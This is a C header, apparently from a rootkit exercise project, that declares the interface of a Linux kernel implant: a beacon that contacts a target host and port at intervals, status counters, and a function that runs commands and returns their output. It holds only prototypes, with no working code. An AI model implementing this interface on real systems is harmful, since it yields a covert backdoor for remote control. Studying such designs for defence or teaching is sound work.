/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKITLINGS_IMPLANT_H
#define ROOTKITLINGS_IMPLANT_H
#include <linux/types.h>

#define AGENT_TASK_SIZE  128
#define AGENT_REPLY_SIZE 256

struct beacon_status {
	unsigned long connections;
	unsigned long requests;
};

int beacon_start(const char *target, unsigned short port,
		 unsigned int interval);
void beacon_stop(void);
void beacon_status(struct beacon_status *status);
int command_run(const char *command, char *reply, size_t size);
#endif
